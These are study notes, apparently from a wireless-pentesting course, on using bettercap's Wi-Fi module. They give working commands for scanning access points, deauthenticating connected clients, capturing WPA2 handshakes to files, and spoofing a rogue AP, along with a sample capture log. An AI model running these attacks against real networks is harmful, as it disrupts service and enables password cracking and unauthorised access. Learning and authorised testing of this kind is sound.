# 13. Bettercap

Same as aircrack-ng. Provides interface flexibility.

Start bettercap

`sudo bettercap -iface wlan0` 

Got multiple tools:

- Bluetooth LE
- HID
- Ethernet
- Wi-Fi

Wifi module allows scanning, deauth, capture WPA handshakes and create AP by spoofing beacons.

Several useful commands: 

- recon: scan 802.11 spectrum for APs and capture WPA handshakes
- deauth: deauth clients from AP
- show: display discovered wireless stations
- ap: create rogue AP

To use each command, have to prepend ‘wifi’ to each of the above command to use. 

i.e. `wifi.recon` 

1. Run `sudo bettercap -iface wlan0` to start
2. Once running, can discover APs using `wifi.recon on`
3. Can switch channel scanning to specific ones using `wifi.recon.channel 6,11` will only scan channel 6 and 11
4. Supports tab-completion on incomplete commands
5. Can set `ticker` comamnds to periodically execute multiple commands. Useful to occasionally run `wifi.show` command to see the APs scanned
    
    `set ticker.commands "clear; wifi.show"`
    
6. Then run the ticker using `ticker on` 
7. Can **sort** in `wifi.show`
    
    `set wifi.show.sort clients desc` - sort clients in descending order
    
8. Can filter to only display APs with WPA2 only
    
    `set wifi.show.filter “WPA2”` 
    
9. Once we have a list of WPA2 APs, can take a look at clients connected to a specific AP using:
    
    `wifi.recon c6:2d:56:2a:53:f8` 
    
    then running `wifi.show` 
    

![Untitled](Untitled%2011.png)

1. To clear filter, use 
    
    `set wifi.show.filter ""`
    
2. To set a filter to see the signal strength use:
    
    `set wifi.rssi.min -49`
    
    then run `wifi.show`
    
3. To exit, run `wifi.recon.clear` or `wifi.clear` or `wifi.recon.off` to stop recon
4. Deauth clients using `wifi.deauth c6:2d:56:2a:53:f8` 
    1. providing an AP to deauth will send deauth packets to all clients connected to the AP
    2. providing a client to deauth will only send deauth packets to the client
5.  Can check if handshake is captured using:
    
    `wifi.client.handshake` 
    
6. Handshakes can be saved to a file using `wifi.handshake.file` 

```bash
 wlan1  » wifi.recon off

 wlan1  » get wifi.handshakes.file 

 OUTPUT:	wifi.handshakes.file: '~/bettercap-wifi-handshakes.pcap'

 wlan0  » set wifi.handshakes.file "/home/kali/handshakes/"

 wlan0  » set wifi.handshakes.aggregate false

 wlan0  » wifi.recon on

 wlan0  » wifi.deauth c6:2d:56:2a:53:f8
 ...
 wlan0  » [16:28:12] [wifi.client.handshake] captured 78:fd:94:b5:ec:88 -> Corporate (c6:2d:56:2a:53:f8) WPA2 handshake (full) to /home/kali/handshakes/Corporate_405d82dcb210.pcap
```

Note: *If MAC address is not discovered, bettercap will not to run deauth command* 

1. Can exclude the mac addresses to skip by specifying 
    
    `set wifi.deauth.skip ac:22:0b:28:fd:22`